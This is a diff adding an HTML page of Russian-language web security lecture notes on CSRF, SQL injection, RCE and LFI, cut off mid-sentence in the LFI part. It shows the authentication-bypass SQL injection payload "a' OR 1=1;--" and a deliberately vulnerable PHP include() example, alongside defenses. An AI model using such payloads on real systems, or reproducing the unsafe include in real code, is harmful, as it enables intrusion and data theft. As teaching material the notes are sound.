+			<ul id="c10c2d86-dbe1-4417-8dbe-b5f017dd6ac0" class="bulleted-list">
+				<li style="list-style-type:disc">использоваться только один раз.</li>
+			</ul>
+			<p id="a70ce6ef-660a-4589-bf59-a02a7e61d1dc" class="">Также можно использовать два токена. Кроме токена,
+				сохраненного в параметрах ответа, существует второй, размещенный в сессионных cookies. Таким образом
+				сервер, получая запрос, проверяет два токена вместо одного. Такую защиту намного сложнее преодолеть.</p>
+			<p id="8bfbb971-ab84-4e01-87ab-2acc6239d727" class=""><strong>Флаг Same-Site Cookies</strong></p>
+			<p id="241485c1-ef7a-4567-b7f9-676f6bc55cfc" class="">Метод похож на использование SOP. Отличие в том, что
+				флаг Same-Site помечает куки для одного доменного имени. В результате источник запроса подвергается
+				проверке. Считается, что cookies и источник запроса имеют одинаковое происхождение, если протокол, порт
+				(если применимо) и хост (но не IP-адрес) одинаковы для обоих. Таким образом не получится отправить
+				запрос с мошеннического сайта. Флаг поддерживает подавляющее большинство современных браузеров, и его
+				использование является хорошей практикой в стратегии защиты.</p>
+			<p id="90afdd02-d07f-4754-93ac-752b9ccfc049" class=""><strong>Подтверждение действий от
+					пользователя</strong></p>
+			<p id="9c67dff3-4111-4fdd-9dd1-733141174a0c" class="">Для отправки денежных средств, изменения
+				аутентификационных данных и т.д. хорошая практика — дополнительное подтверждающее действие. Например,
+				после попытки смены пароля можно попросить пользователя нажать на кнопку на сайте или ввести капчу. Это
+				является еще одной отправкой запроса. Вместе с вышеупомянутыми методами это обеспечивает надежную защиту
+				сайта и веб-приложения.</p>
+			<p id="a1f73d51-ee1d-4524-a0bd-d508b7d3163f" class="">Более подробно о защите от CSRF вы можете почитать на
+				<a
+					href="https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html">сайте
+					OWASP</a>.</p>
+			<p id="bb1102f3-6413-4279-ba2e-26e648c04f25" class="">
+			</p>
+			<h1 id="d3b9a9ed-8a53-41f9-9781-bbcbdb61f8c2" class="">SQL-Injection</h1>
+			<p id="58b70a7f-f706-46e1-83f1-c5cf0c2e1221" class="">Внедрение SQL-кода (SQL инъекция) — один из
+				распространённых способов взлома сайтов, работающих с базами данных. Уязвимости SQL-инъекций позволяют
+				злоумышленникам выполнять произвольный код SQL в базе данных, позволяя получать, изменять или удалять
+				данные независимо от разрешений пользователя. Успешная инъекционная атака может подделать удостоверения,
+				создать новые удостоверения с правами администратора, получить доступ ко всем данным на сервере или
+				уничтожить / изменить данные, чтобы сделать их непригодными для использования.</p>
+			<p id="5b346e8f-dd59-46d3-9796-bfbfc2134e81" class="">Задача хакера — попытаться изменить SQL-выражение,
+				которое веб-сервис направляет в БД. Для этого в форму аутентификации для пользователя поставляются
+				специальные данные. Ниже приведем несколько примеров для наглядности.</p>
+			<h3 id="792a1416-55cd-4911-a00f-0afe4ced0a07" class="">Пример атаки с SQL-инъекцией</h3>
+			<figure id="10bc4362-6529-4e49-ba3a-5bc86797dbf1" class="image"><a
+					href="%D0%9C%D0%B0%D1%82%D0%B5%D1%80%D0%B8%D0%B0%D0%BB%20%D0%BB%D0%B5%D0%BA%D1%86%D0%B8%D0%B8%206730a7e902a54e9c9fa5e01c23947b51/Untitled%207.png"><img
+						style="width:1362px"
+						src="%D0%9C%D0%B0%D1%82%D0%B5%D1%80%D0%B8%D0%B0%D0%BB%20%D0%BB%D0%B5%D0%BA%D1%86%D0%B8%D0%B8%206730a7e902a54e9c9fa5e01c23947b51/Untitled%207.png" /></a>
+			</figure>
+			<p id="c01688c5-e32a-4e6f-9909-8aed25ad1db1" class="">Вводимые пользователем в форму имя и пароль всегда
+				сверяются с данными из БД. Если там всё верно и нет никаких ошибок, то веб-страница разрешит ему доступ.
+			</p>
+			<p id="d2591e09-9c12-4634-8073-b0aaa3e9cd06" class="">В БД отправляется такой SQL-запрос:</p>
+			<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"
+				integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg=="
+				crossorigin="anonymous" referrerPolicy="no-referrer"></script>
+			<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css"
+				integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ=="
+				crossorigin="anonymous" referrerPolicy="no-referrer" />
+			<pre id="654b2792-27e2-4584-89fd-d217fd1285e4"
+				class="code"><code class="language-SQL">SELECT * FROM users WHERE username=’ProvidedUsername’ and password=’ProvidedPassword’;</code></pre>
+			<p id="73503af8-5016-4a75-862b-765ab57a3643" class="">В этом случае произойдёт извлечение из таблицы
+				<code>users</code> всех тех записей, где указано имя
+				пользователя <em><code>ProvidedUsername</code></em>, а пароль — <em><code>ProvidedPassword</code></em>.
+				Если в таблице найдётся запись, соблюдающая оба этих условия, то пользователь правильно ввёл имя и
+				пароль. А значит, ему откроется доступ.</p>
+			<p id="2cdc834d-d45d-42ca-880c-f9eca5fc4f18" class="">Теперь предположим, что вместо имени пользователь
+				введёт вот это:</p>
+			<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"
+				integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg=="
+				crossorigin="anonymous" referrerPolicy="no-referrer"></script>
+			<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css"
+				integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ=="
+				crossorigin="anonymous" referrerPolicy="no-referrer" />
+			<pre id="040620ad-f514-4f29-9f83-3a7d33c91236"
+				class="code"><code class="language-SQL">a’ OR 1=1;--</code></pre>
+			<p id="188ccd2d-a287-4e14-bf36-2c4ffcff194f" class="">А вместо пароля — случайный набор символов. Приложение
+				сформирует следующее SQL-выражение:</p>
+			<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"
+				integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg=="
+				crossorigin="anonymous" referrerPolicy="no-referrer"></script>
+			<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css"
+				integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ=="
+				crossorigin="anonymous" referrerPolicy="no-referrer" />
+			<pre id="ffea1947-0d89-40c8-a38b-c460ca178856"
+				class="code"><code class="language-SQL">SELECT * FROM users WHERE username=’a’ OR 1=1;--’ and password=’RandomPass’;</code></pre>
+			<p id="ed5b2269-1773-4ac6-8260-4e5b0d294fa5" class="">При обработке этого запроса БД извлечёт запись из
+				таблицы с именем <code>users</code>, если в ней имя пользователя указано как <em><code>a</code></em>.
+				Она будет извлечена и в случае выполнения второго условия — если выражение <code>1=1</code> верно. То
+				есть тут используется принцип «‎верно это значение ИЛИ то значение». А так как <code>1=1</code> верно
+				всегда, при вводе такого запроса будут извлечены все записи из таблицы.</p>
+			<p id="ab78305a-9799-419d-9aa3-72e7f1379652" class="">Обратите также внимание на дублирующийся дефис в
+				SQL-выражении. Его используют для комментариев — получается, что остальная часть строки будет
+				закомментирована. То есть БД её обрабатывать не будет.</p>
+			<p id="6c14f34a-9ea0-41c5-ad27-6229488e0977" class="">Комментарии могут быть двух типов:
+				<strong>однострочные</strong> и <strong>многострочные</strong>. В зависимости от типа применяется
+				различный синтаксис. Однострочные начинаются с сочетания двух тире (<code><strong>--</strong></code>) и
+				продолжаются до конца строки. Многострочные комментарии начинаются с сочетания символов слеша и
+				звездочки (<code>/*</code>) и заканчиваются ими же, но в другой последовательности (<code>*/</code>).
+			</p>
+			<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"
+				integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg=="
+				crossorigin="anonymous" referrerPolicy="no-referrer"></script>
+			<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css"
+				integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ=="
+				crossorigin="anonymous" referrerPolicy="no-referrer" />
+			<pre id="2e154e86-0e1a-4622-bab5-ceb01012c6a4" class="code"><code class="language-SQL">-- Пример однострочного комментария
+
+/* Комментарий
+на
+несколько
+строк  */
+
+/* Многострочный комментарий в одну строку */</code></pre>
+			<p id="277c3868-f7cf-422d-aff6-ce86243bf90d" class="">Синтаксис комментариев зависит от системы, к которой
+				выполняется запрос. Приведенные выше примеры подходят для систем MS SQL Server и Oracle, являющимися
+				самыми распространенными.</p>
+			<p id="46eb2113-9ba0-4c35-b6b2-7ad36bb355a8" class="">Получается, что БД выполнит только эту часть запроса:
+			</p>
+			<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"
+				integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg=="
+				crossorigin="anonymous" referrerPolicy="no-referrer"></script>
+			<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css"
+				integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ=="
+				crossorigin="anonymous" referrerPolicy="no-referrer" />
+			<pre id="d67618fc-cba5-4fb0-92e3-0b571d9da54c"
+				class="code"><code class="language-SQL">SELECT * FROM users WHERE username=’a’ OR 1=1;--’ and password=’RandomPass’;</code></pre>
+			<p id="e5fc1305-ff56-45c6-a99c-8dc122302f54" class="">При обработке запроса БД извлечёт список записей,
+				которые отличаются от NULL. Следовательно, пользователь получит доступ.</p>
+			<h2 id="93170c4f-2b6b-4126-b203-020562288332" class=""><strong>Типы SQLi</strong></h2>
+			<p id="8cf8c743-b33d-4820-902e-63389bcfc28a" class="">Существует 5 основных типов SQL инъекций:</p>
+			<ol type="1" id="0ea73d24-adfc-49b1-857a-76c52e4bf2ad" class="numbered-list" start="1">
+				<li>Классическая (In-Band или Union-based). Самая опасная и редко встречающаяся сегодня атака. Позволяет
+					сразу получать любые данные из базы.</li>
+			</ol>
+			<ol type="1" id="f3ce34f4-80a5-4d1d-b5db-e26130b880d0" class="numbered-list" start="2">
+				<li>Error-based. Позволяет получать информацию о базе, таблицах и данных на основе выводимого текста
+					ошибки СУБД.</li>
+			</ol>
+			<ol type="1" id="4b0e55b0-310e-4f03-8885-8c440547b0e2" class="numbered-list" start="3">
+				<li>Boolean-based. Вместо получения всех данных, атакующий может поштучно их перебирать, ориентируясь на
+					простой ответ типа true/false.</li>
+			</ol>
+			<ol type="1" id="bc75ae53-12cb-4a1b-85da-689a3a1beed8" class="numbered-list" start="4">
+				<li>Time-based. Похожа на предыдущую атаку принципом перебора, манипулируя временем отклика базы.</li>
+			</ol>
+			<ol type="1" id="e9d8176b-ee74-4c62-aa3a-3e04a787f2a7" class="numbered-list" start="5">
+				<li>Out-of-Band. Очень редкие и специфические типы атак, основанные на индивидуальных особенностях баз
+					данных.</li>
+			</ol>
+			<h2 id="2d1b4107-1201-4e26-8b6a-1015b6502aad" class="">Защита от SQL-инъекций</h2>
+			<p id="fde5bae9-1ef3-47cf-846d-64003488ed23" class=""><strong>Параметризуйте</strong></p>
+			<p id="6369b64b-cc54-4d93-87ee-f05f952a3942" class="">Самое главное правило — данные, присылаемые
+				пользователем, не должны участвовать в формировании текста SQL-запроса, во всяком случае напрямую.
+				Достигается это использованием параметризированных (подготовленных) запросов.</p>
+			<p id="e341881c-7dfe-4935-a28a-67f250dccfa7" class="">Так, вместо подстановки (конкатенации)
+				пользовательского ввода, надо использовать параметры, например, в случае C# вместо фрагмента:</p>
+			<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"
+				integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg=="
+				crossorigin="anonymous" referrerPolicy="no-referrer"></script>
+			<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css"
+				integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ=="
+				crossorigin="anonymous" referrerPolicy="no-referrer" />
+			<pre id="76325f79-8d74-46b8-a4b3-d2a6172a3e6a" class="code"><code class="language-C#">var selectProductQuery =
+@&quot;
+SELECT
+	Id,
+	Name,
+	Price
+FROM
+	Products
+WHERE
+	Name LIKE &#x27;&quot; + productName + &quot;%&#x27;&quot;;
+command.CommandText = selectProductQuery;
+var reader = command.ExecuteReader();</code></pre>
+			<p id="7d6a78c6-4b0d-4232-9321-5420fcdea51e" class="">Надо использовать следующий код:</p>
+			<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"
+				integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg=="
+				crossorigin="anonymous" referrerPolicy="no-referrer"></script>
+			<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css"
+				integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ=="
+				crossorigin="anonymous" referrerPolicy="no-referrer" />
+			<pre id="db01aa8d-d3f1-4869-925c-18bc0534a0e3" class="code"><code class="language-C#">command.CommandText =
+@&quot;
+SELECT
+	Id,
+	Name,
+	Price
+FROM
+	Products
+WHERE
+	Name LIKE @p_productName&quot;;
+command.Parameters.AddWithValue(&quot;p_productName&quot;, productName);
+var reader = command.ExecuteReader();</code></pre>
+			<p id="739bac30-0666-46ab-a5a9-e548c44fed31" class="">В этом случае, какой бы текст пользователь не ввел в
+				поле поиска продукта, приложение будет искать этот текст в качестве имени продукта, и если в тексте
+				содержится нерелевантный фрагмент (например, с SQL-выражениями), никакой инъекции не произойдет, и
+				продукт просто-напросто не будет найден.</p>
+			<p id="5b60301c-a0d8-42f7-bab6-0083d9c35e69" class=""><strong>Используйте хранимые процедуры</strong></p>
+			<p id="04528dd4-b074-49e1-93c2-5775c0fd2952" class="">С технической точки зрения, это правило идентично
+				предыдущему: пользовательский ввод не используется при динамической генерации SQL-запроса. Код хранимой
+				процедуры неизменный и хранится в самой СУБД, а не в коде приложения.</p>
+			<p id="bae2bf1b-3ce2-4831-9d36-9f542286fc30" class=""><strong>Используйте белый список валидации</strong>
+			</p>
+			<p id="e5ff9aea-ccf8-4394-b4b0-e85a32e19809" class="">В некоторых случаях невозможно использовать
+				параметризацию запросов.</p>
+			<p id="8cfe1fa0-52c1-427a-bbd9-0a7f915d8864" class=""><em>Например, имя таблицы, из которой происходит
+					выборка </em><em><code>SELECT</code></em><em>, не может быть параметром, и в этом случае сам текст
+					запроса формируется в зависимости от ввода пользователя.</em></p>
+			<p id="1f94f888-da9a-4742-8599-0e17126f1fe7" class="">В таком случае необходимо ограничить список допустимых
+				значений, которые могут прийти от пользователя («белый список»).</p>
+			<p id="b2f8a9f2-7b50-473d-9c94-a23497252bbf" class=""><em>Например, если из выпадающего списка веб-формы
+					приходит значение </em><em><code>Customers</code></em><em>, то мы производим выборку из
+					таблицы </em><em><code>Customers</code></em><em>, а если
+					значение </em><em><code>Supplier</code></em><em>» — то из
+					таблицы </em><em><code>Suppliers</code></em><em>.</em></p>
+			<p id="f4e12f64-712a-42e1-962c-42bcc4e79a05" class="">Но если придет значение <code>System_Users</code>,
+				которого приходить не должно, то это, скорее всего, значит, что мы имеем дело с злоумышленником, который
+				с помощью Swagger или подобной программы пытается проверить наше приложение на прочность:</p>
+			<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"
+				integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg=="
+				crossorigin="anonymous" referrerPolicy="no-referrer"></script>
+			<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css"
+				integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ=="
+				crossorigin="anonymous" referrerPolicy="no-referrer" />
+			<pre id="61df898a-d90b-4e3c-b581-d615f673f89f" class="code"><code class="language-C#">switch (param)
+{
+	case &quot;Customers&quot;:
+		tableName = &quot;Customers&quot;;
+		break;
+	case &quot;Suppliers&quot;:
+		tableName = &quot;Suppliers&quot;;
+		break;
+	default:
+		throw new InputValidationException(&quot;Unexpected value.&quot;);
+}</code></pre>
+			<p id="54f58181-faed-4f07-bd45-26afb99776a2" class=""><strong>Валидируйте пользовательский ввод</strong></p>
+			<p id="746d5219-a9d6-4c7c-a34c-8fe93b3c9910" class="">Вообще в работе с пользовательским вводом
+				руководствуйтесь принципом «пользователь — всегда потенциальный злоумышленник». Бэкенд не имеет права
+				слепо доверять ничему, что приходит с клиента, даже если клиентское приложение валидирует
+				пользовательский ввод. Злоумышленник может использовать Swagger, автоматические скрипты и другие
+				средства преодоления клиентской валидации.</p>
+			<p id="68f6b6b3-f13f-431d-aa3f-0bdc00238d8d" class=""><strong>Поменьше привилегий</strong></p>
+			<p id="457c84e5-5ef7-4087-8f8b-cadd3e1fd20f" class="">Системный пользователь (системная учетная запись),
+				которая осуществляет доступ к данным, должна иметь как можно меньше привилегий на сервере.</p>
+			<p id="d4490dfa-a035-4009-9698-4a0ec3489238" class="">Не может быть и речи о том, чтобы этой учетной записи
+				было позволено читать и создавать файлы, не относящиеся к приложению, и производить другие критические с
+				точки зрения безопасности действия.</p>
+			<p id="edeae263-ed5c-4346-ad25-0b6c663cdda4" class=""><strong>Проверяйтесь</strong></p>
+			<p id="655d3f99-4398-4fa5-ad9a-3617ea168685" class="">Всегда полезно проверять свое приложение на
+				устойчивость, в том числе по отношению к SQLi-атакам. Одна из мощнейших и старейших утилит,
+				предназначенных для поиска и устранения SQLi-уязвимостей — https://sqlmap.org/.</p>
+			<h1 id="51ec8a7c-cd6f-4ddd-b73d-4339286b481c" class="">RCE</h1>
+			<p id="42bff570-132e-4173-bd61-0916d80826ff" class=""><strong>Удаленное выполнение кода (RCE)</strong>
+				позволяет злоумышленнику выполнить произвольный код на удаленном устройстве. Злоумышленник может достичь
+				RCE несколькими различными способами, включая:</p>
+			<ul id="8eaf71c9-0b44-489d-a2ab-64de44df156d" class="bulleted-list">
+				<li style="list-style-type:disc"><strong>Инъекционные атаки</strong>: многие различные типы приложений,
+					например, SQL-запросы, используют данные, предоставленные пользователем, в качестве входных данных
+					для команды. При атаке инъекции злоумышленник намеренно предоставляет неправильно оформленные
+					данные, в результате чего часть его ввода интерпретируется как часть команды. Это позволяет
+					злоумышленнику формировать команды, выполняемые на уязвимой системе, или выполнять на ней
+					произвольный код.</li>
+			</ul>
+			<ul id="71c9d109-eb50-4d06-b9ab-ebbbd9b64742" class="bulleted-list">
+				<li style="list-style-type:disc"><strong>Атаки на десериализацию:</strong> приложения обычно используют
+					сериализацию для объединения нескольких частей данных в одну строку, чтобы облегчить передачу или
+					обмен данными. Специально отформатированный пользовательский ввод в сериализованных данных может
+					быть интерпретирован программой десериализации как исполняемый код.</li>
+			</ul>
+			<ul id="455fdde7-49c2-4ee2-80ec-9fce501fb46a" class="bulleted-list">
+				<li style="list-style-type:disc"><strong>Запись за пределы границ:</strong> приложения регулярно
+					выделяют участки памяти фиксированного размера для хранения данных, включая данные, предоставленные
+					пользователем. Если это распределение памяти выполнено неправильно, злоумышленник может разработать
+					вход, который записывает данные за пределы выделенного буфера. Поскольку исполняемый код также
+					хранится в памяти, данные, предоставленные пользователем, записанные в нужном месте, могут быть
+					выполнены приложением.</li>
+			</ul>
+			<h3 id="f0ec524d-1d70-4322-b962-b82dc787396f" class="">Примеры RCE-атак</h3>
+			<p id="d9cf4c2c-faa1-49e2-89ca-b522bc9926ad" class="">RCE являются одними из самых опасных и
+				высокоэффективных уязвимостей. Многие крупные кибератаки были осуществлены с помощью уязвимостей RCE, в
+				том числе:</p>
+			<p id="c35320a1-9ed6-4794-ac62-f52dfa52fd24" class=""><strong>Log4j</strong></p>
+			<p id="b7821eb1-799b-490c-a261-0b4905de38a4" class="">Log4j - это популярная библиотека протоколирования на
+				языке Java, которая используется во многих интернет-сервисах и приложениях. В декабре 2021 года в Log4j
+				были обнаружены многочисленные уязвимости RCE, которые позволяли злоумышленникам использовать уязвимые
+				приложения для выполнения криптоджекеров и других вредоносных программ на взломанных серверах.</p>
+			<p id="f66567f0-553a-41ef-b208-032bd982c1ec" class=""><strong>ETERNALBLUE</strong></p>
+			<p id="e731330a-3348-4560-8764-0f17fb93f402" class="">WannaCry в 2017 году вывел вымогательское ПО в
+				мейнстрим. Червь WannaCry ransomware распространился благодаря использованию уязвимости в протоколе
+				Server Message Block Protocol (SMB). Эта уязвимость позволяла злоумышленнику выполнять вредоносный код
+				на уязвимых машинах, что давало возможность программе-вымогателю получить доступ к ценным файлам и
+				зашифровать их.</p>
+			<h3 id="2f7453f5-553d-4b5e-a4be-60801a3b37b4" class="">Последствия<strong> RCE-атак</strong></h3>
+			<p id="d4d70c93-9ab5-4d33-afea-659883b9026c" class="">Некоторые из основных последствий атаки RCE включают:
+			</p>
+			<ul id="b678dce3-0e4c-4fd0-88ba-aa3acacfeea0" class="bulleted-list">
+				<li style="list-style-type:disc"><strong>Первоначальный доступ</strong><br />Атаки RCE обычно начинаются
+					с уязвимости в общедоступном приложении, которая дает возможность выполнять команды на хостовой
+					машине. Злоумышленники могут использовать это для получения первоначального доступа к устройству для
+					установки вредоносного ПО или достижения других целей.<br /></li>
+			</ul>
+			<ul id="9f98b221-b32a-409d-9535-69bede031b3e" class="bulleted-list">
+				<li style="list-style-type:disc"><strong>Раскрытие информации</strong><br />Атаки RCE могут быть
+					использованы для установки вредоносного ПО для кражи данных или для прямого выполнения команд,
+					которые извлекают и удаляют данные с уязвимого устройства.<br /></li>
+			</ul>
+			<ul id="9ba43460-e1e1-4e89-9b31-795de5dee686" class="bulleted-list">
+				<li style="list-style-type:disc"><strong>Отказ в обслуживании</strong><br />Уязвимость RCE позволяет
+					злоумышленнику выполнить код на системе, на которой установлено уязвимое приложение. Это может
+					позволить им нарушить работу этого или других приложений в системе.<br /></li>
+			</ul>
+			<ul id="ba90eed0-b804-40e4-8e78-a0c0a1862c6d" class="bulleted-list">
+				<li style="list-style-type:disc"><strong>Криптомайнинг</strong><br />Вредоносные программы для
+					криптомайнинга или криптоджекинга используют вычислительные ресурсы взломанного устройства для
+					добычи криптовалюты. Уязвимости RCE обычно используются для развертывания и выполнения вредоносных
+					программ для криптомайнинга на уязвимых устройствах.<br /></li>
+			</ul>
+			<ul id="a355be7f-b2e7-4ecf-8743-df2a7d43d178" class="bulleted-list">
+				<li style="list-style-type:disc"><strong>Ransomware<br /><br /></strong>Ransomware
+					(программа-вымогатель) - это вредоносное ПО, предназначенное для лишения пользователя доступа к его
+					файлам до тех пор, пока он не заплатит выкуп за восстановление доступа.</li>
+			</ul>
+			<p id="85a567c4-0ce6-411f-9093-e39a971c419f" class="">Хотя это одни из самых распространенных последствий,
+				уязвимость RCE может предоставить злоумышленнику полный доступ и контроль над взломанным устройством,
+				что делает их одним из самых опасных и критических типов уязвимостей.</p>
+			<h3 id="ade41644-e74a-4f33-8c43-6f4f3dfdcdf2" class="">Защита от RCE-атак</h3>
+			<p id="d4a45aec-da79-4b49-908e-be8cf60fa214" class="">Атаки RCE могут использовать целый ряд уязвимостей,
+				что затрудняет защиту от них с помощью какого-либо одного подхода. Некоторые передовые методы
+				обнаружения и смягчения последствий атак RCE включают:</p>
+			<ul id="d2922e9b-560e-4da3-8e4e-6fe98f0dc0b9" class="bulleted-list">
+				<li style="list-style-type:disc"><strong>Безопасное управление памятью<br /><br /></strong>Атаки RCE
+					могут использовать проблемы с управлением памятью, такие как переполнение буфера. Приложения должны
+					проходить проверку на уязвимости для обнаружения переполнения буфера и других уязвимостей, чтобы
+					выявить и устранить эти ошибки.</li>
+			</ul>
+			<ul id="29368d28-01b5-4814-9b53-f0d784fccae1" class="bulleted-list">
+				<li style="list-style-type:disc"><strong>Проверка трафика</strong><br />Атаки RCE происходят по сети,
+					при этом злоумышленник использует уязвимый код и с его помощью получает первоначальный доступ к
+					корпоративным системам. Организация должна развернуть решения сетевой безопасности, которые могут
+					блокировать попытки эксплуатации уязвимых приложений и обнаруживать удаленный контроль корпоративных
+					систем злоумышленником.<br /></li>
+			</ul>
+			<ul id="b6103d93-6ad3-498f-825c-1548b416d5fd" class="bulleted-list">
+				<li style="list-style-type:disc"><strong>Контроль доступа<br /><br /></strong>Атака RCE дает
+					злоумышленнику возможность закрепиться в корпоративной сети. Внедряя сегментацию сети, управление
+					доступом и стратегию безопасности с нулевым доверием, организация может ограничить возможности
+					злоумышленника перемещаться по сети и воспользоваться своим первоначальным доступом к корпоративным
+					системам.</li>
+			</ul>
+			<ul id="c8b2ec7c-642e-4128-be6d-6e13cad284bc" class="bulleted-list">
+				<li style="list-style-type:disc"><strong>Проверка ввода</strong><br />Атаки RCE обычно используют
+					уязвимости инъекции и десериализации. Проверка пользовательского ввода перед его использованием в
+					приложении помогает предотвратить многие типы атак RCE.<br /></li>
+			</ul>
+			<p id="1aac17d9-ff58-4823-84b7-7b52d3732000" class="">
+			</p>
+			<h1 id="b0dd089f-38f0-460f-9f63-a2201ff8f929" class="">LFI, Path Traversal</h1>
+			<p id="4c8b5abb-5e69-480f-8306-dbe5cfeb765f" class=""><strong>Local File Inclusion (LFI)</strong> — это
+				возможность использования локальных файлов сервера. Уязвимость позволяет удаленному пользователю
+				получить доступ с помощью специально сформированного запроса к произвольным файлам на сервере, в том
+				числе потенциально содержащим конфиденциальную информацию.</p>
+			<p id="7df305b6-d1fb-49a2-a71d-77ca47bbb7d9" class="">Возникает подобная уязвимость в том случае, если при
+				реализации веб-приложения используются небезопасные функции, например, <code>include</code>, позволяющие
+				включать контент на страницу из локального файла. В нашем случае это выглядит следующим образом:</p>
+			<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"
+				integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg=="
+				crossorigin="anonymous" referrerPolicy="no-referrer"></script>
+			<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css"
+				integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ=="
+				crossorigin="anonymous" referrerPolicy="no-referrer" />
+			<pre id="8102e615-cf12-41c2-ad53-1e0ae3ef10b3"
+				class="code"><code class="language-PHP">&lt;?php
+	$file = $_GET[&#x27;file&#x27;];
+	if(isset($file))
+	{
+		include(&quot;$file&quot;);
+	}
+	?&gt;
+&lt;b&gt; &lt;p align=&quot;center&quot;&gt;Пример веб-приложения, доступный в Интеренте.&lt;/p&gt;&lt;/b&gt;</code></pre>
+			<p id="32a84d58-dc3f-47a6-8301-d3c99bdf5f63" class="">Благодаря
+				строчке <code>include(“$file”)</code><strong> </strong>в содержимое страницы будет включаться значение
+				GET-параметра <code>file</code>. Теперь, используя эту уязвимость, нам будут возвращаться локальные
+				файлы, которые мы укажем в параметре.</p>
+			<p id="7d25edf6-44e4-4782-a964-258635cec70b" class="">Статья носит информационный характер. Не нарушайте
+				законодательство.</p>
+			<h3 id="39864c32-4cd7-48fe-802a-2c1218dbc0cf" class="">Обнаружение уязвимости</h3>
+			<p id="52563ef2-9e4f-41a3-b536-94e794deaa40" class="">Как обнаружить уязвимость? Если указать в потенциально
+				уязвимом параметре включение какого-то локального файла, например, <strong>index </strong>с любым
+				расширением, и этот файл откроется, то однозначно можно утверждать, что параметр отвечает за подкачку
+				файла. Сделать это можно как вручную, так и с помощью различных автоматизированных инструментов,
+				например, сканером уязвимостей <strong>Wapiti</strong>, или специализированным инструментом
+				<strong>LFISuite</strong>, который разработан именно под поиск и эксплуатацию LFI-уязвимостей.</p>
+			<p id="31c26ce5-8946-466b-84d8-c1fac95962c4" class="">Какие здесь могут быть подводные камни? Например,
